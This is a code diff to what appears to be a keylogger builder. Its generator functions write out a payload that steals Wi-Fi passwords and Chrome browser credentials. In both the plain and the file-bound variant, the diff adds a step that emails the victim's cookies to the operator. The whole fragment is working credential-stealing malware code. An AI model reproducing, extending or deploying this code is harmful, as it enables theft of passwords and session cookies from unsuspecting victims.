@@ -136,7 +136,9 @@ def create_keylogger(file_name, interval, email, password, time_persistent, smtp
             file.write(f"\tsteal.get_wifi_creds()\n")
             file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
             file.write(f"\tsteal.get_chrome_browser_creds()\n")
-            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")
+            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n")
+            file.write(f"\tsteal.send_mail_with_attachment()\n")
+            file.write(f"\tprint(\"[+] Cookies Send Successfully!\")\n\n")
         
         file.write("def check_and_start():\n")
         file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
@@ -180,7 +182,9 @@ def create_keylogger_binded(file_name, interval, email, password, time_persisten
             file.write(f"\tsteal.get_wifi_creds()\n")
             file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
             file.write(f"\tsteal.get_chrome_browser_creds()\n")
-            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")        
+            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n")   
+            file.write(f"\tsteal.send_mail_with_attachment()\n")
+            file.write(f"\tprint(\"[+] Cookies Send Successfully!\")\n\n")
         
         file.write("def check_and_start():\n")
         file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
